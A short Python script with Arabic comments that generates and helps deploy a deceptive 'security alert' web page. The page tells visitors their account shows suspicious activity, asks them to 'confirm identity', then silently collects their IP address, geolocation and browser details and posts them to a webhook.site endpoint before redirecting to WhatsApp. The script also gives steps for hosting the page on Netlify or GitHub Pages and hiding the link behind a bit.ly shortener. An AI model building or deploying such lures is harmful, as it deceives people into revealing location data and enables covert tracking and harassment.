#!/usr/bin/env python3
"""
نشر سريع للنظام - تشغيل خلال 30 ثانية
"""

import os
import webbrowser

def create_files():
    print("🚀 إنشاء ملفات النظام...")
    
    # إنشاء index.html
    html_content = """<!DOCTYPE html>
<html>
<head>
    <title>تنبيه أمني</title>
    <style>body{background:#000;color:#fff;text-align:center;padding:50px;}</style>
</head>
<body>
    <h1>⚠️ تحذير: نشاط مشبوه على حسابك</h1>
    <p>اضغط للتأكيد أنك المالك:</p>
    <button onclick="track()" style="padding:15px;background:red;color:white;">تأكيد الهوية</button>
    <script>
        async function track() {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const geo = await fetch(`https://ipapi.co/${ip.ip}/json/`).then(r => r.json());
            
            const data = {
                ip: ip.ip,
                location: `${geo.city}, ${geo.country}`,
                time: new Date().toISOString(),
                device: navigator.userAgent
            };
            
            // إرسال البيانات
            fetch('https://webhook.site/توكن-خاص-بك', {
                method: 'POST',
                body: JSON.stringify(data)
            });
            
            document.body.innerHTML = '<h2>✅ تم التحقق! جاري التوجيه...</h2>';
            setTimeout(() => window.location.href = 'https://whatsapp.com', 2000);
        }
    </script>
</body>
</html>"""
    
    with open('index.html', 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print("✅ تم إنشاء index.html")
    print("🌐 انشر الملف على GitHub Pages أو Netlify")
    print("🔗 استخدم bitly.com لتقصير الرابط")

if __name__ == "__main__":
    create_files()
    print("\n📞 أرقام الطوارئ:")
    print("- الشرطة: 122")
    print("- الجرائم الإلكترونية: 16023")
    print("- Meta الطوارئ: emergency@meta.com")
    
    # فتح المتصفح للاستضافة السريعة
    webbrowser.open("https://www.netlify.com")
    webbrowser.open("https://bitly.com")
